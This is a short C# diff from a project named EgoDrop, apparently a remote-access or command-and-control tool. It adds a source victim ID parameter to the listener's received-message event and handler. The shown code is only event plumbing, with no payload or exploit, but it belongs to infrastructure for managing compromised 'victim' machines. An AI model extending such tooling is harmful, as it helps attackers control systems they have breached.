@@ -18,7 +18,7 @@ namespace EgoDrop
 
         public delegate void dlgNewVictim(clsListener listener, clsVictim victim);
         public event dlgNewVictim evtNewVictim;
-        public delegate void dlgReceivedMessage(clsListener listener, clsVictim victim, List<string> lsMsg);
+        public delegate void dlgReceivedMessage(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg);
         public event dlgReceivedMessage evtReceivedMessage;
         public delegate void dlgVictimDisconnected(clsListener listener, clsVictim victim);
         public event dlgVictimDisconnected evtVictimDisconnected;
@@ -45,9 +45,9 @@ namespace EgoDrop
             evtNewVictim?.Invoke(this, victim);
         }
 
-        public void fnOnReceivedMessage(clsVictim victim, List<string> lsMsg)
+        public void fnOnReceivedMessage(clsVictim victim, string szSrcVictimID, List<string> lsMsg)
         {
-            evtReceivedMessage?.Invoke(this, victim, lsMsg);
+            evtReceivedMessage?.Invoke(this, victim, szSrcVictimID, lsMsg);
         }
 
         public void fnOnVictimDisconnected(clsVictim victim)
